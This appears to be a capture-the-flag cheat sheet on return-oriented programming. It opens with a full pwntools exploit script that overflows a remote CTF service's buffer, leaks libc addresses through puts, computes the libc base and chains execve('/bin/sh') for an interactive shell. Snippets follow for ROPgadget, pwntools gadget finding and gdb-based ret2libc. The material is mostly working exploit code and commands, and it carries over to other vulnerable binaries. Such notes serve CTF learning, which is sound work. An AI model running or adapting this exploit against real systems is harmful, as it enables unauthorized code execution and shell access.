### Sample ROP script for leaking puts or other function
```python
from pwn import *

context.clear(arch="amd64")
context.log_level = "info"

REMOTE = True

binary = "tama"

if REMOTE: libc = ELF("/home/user/ctf/libc-database/libs/libc6_2.31-0ubuntu9.9_amd64/libc.so.6")
else: libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF(binary)
rop = ROP(elf)

if REMOTE: p = remote("motherload.td.org.uit.no", 8009)
else: p = process(elf.path)


def get_libc_address(libc_symbol):
    rop = ROP(elf)
    
    padding = b"A"*40
    rop.call("puts", [elf.got[libc_symbol]]) # puts(elf.got[libc_symbol])
    rop.call("main") # main

    p.recvuntil(b">> ")
    p.sendline(b"2")
    p.recvuntil(b">> ")

    p.sendline(padding + rop.chain())
    p.recvline();p.recvline();p.recvline()

    leak = p.recvline().strip(b"\n")
    leak = u64(leak.ljust(8,b"\x00"))

    log.info(f"Leaked {libc_symbol} address: {hex(leak)}")
    return leak


libc_puts_leak = get_libc_address("puts")
libc_printf_leak = get_libc_address("printf")

libc.address = libc_puts_leak - libc.symbols["puts"]
log.info("Libc base address: " + hex(libc.address))


pause()

p.recvuntil(b">> ")
p.sendline(b"2")
p.recvuntil(b">> ")


rop = ROP([elf, libc])

padding = b"A"*40

## WITH SYSTEM
#rop.call("puts", [next(libc.search(b"/bin/sh"))])
#rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])

binsh = next(libc.search(b"/bin/sh"))
rop.execve(binsh, 0, 0)

p.sendline(padding + rop.chain())

p.interactive()
```

### Finding libc version
```c
./find puts 420 printf c90
ubuntu-glibc (libc6_2.31-0ubuntu9.9_amd64)
```


### ROPgadget
https://github.com/JonathanSalwan/ROPgadget
```c
// Finding ret
ROPgadget --binary program --opcode c3

// To find pop rdi; ret gadget
ROPgadget --binary leak_me --only "pop|rdi|ret"

// To find every gadget
ROPgadget --binary leak_me --ropchain

// Finding /bin/sh string
ROPgadget --binary leak_me --string  "/bin/sh"
```

### Finding Gadgets with pwntools
#### GOT
```python
elf = ELF("./BINARY")

# Finding puts got address
putsGOT = elf.got["puts"]
```
#### PLT
```python
elf = ELF("./BINARY")
rop = ROP("./BINARY")

# Finding puts plt address
putsPLT = elf.plt["puts"]

# Finding pop rdi; ret gadget
poprdiret = rop.find_gadget(["pop rdi", "ret"])[0]

# Finding pop rdi gadget
poprdi = rop.find_gadget(["pop rdi"])[0]
```

#### Address of segments (.data, .text, ...)
```python
elf.address + elf.get_section_by_name(".data").header.sh_addr
```

#### Finding function address pwntools
```python
main = elf.symbols["main"]
```

#### Padding binary data
```python
leak = p.recvline().strip(b"\n")
leak = u64(leak.ljust(8,b"\x00"))
```

#### Unpacking binary data
```python
leak = u64(p.recvline().strip(b"\n"))
```

#### Finding strings in libc pwntools
```python
libc = ELF("libc.so.6")
libc_binsh = next(libc.search(b"/bin/sh"))
```

### Ret2Libc
https://rehex.ninja/posts/identifying-libc/
```shell
// Find libc base location
(gdb) info proc mapping
0xb7e97000

// Find system() from libc
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

// Find exit() from libc
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

// Find "/bin/sh" string in libc
$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
11f3bf /bin/sh

// Address of "/bin/sh"
0xb7e97000 + 0x11f3bf
```
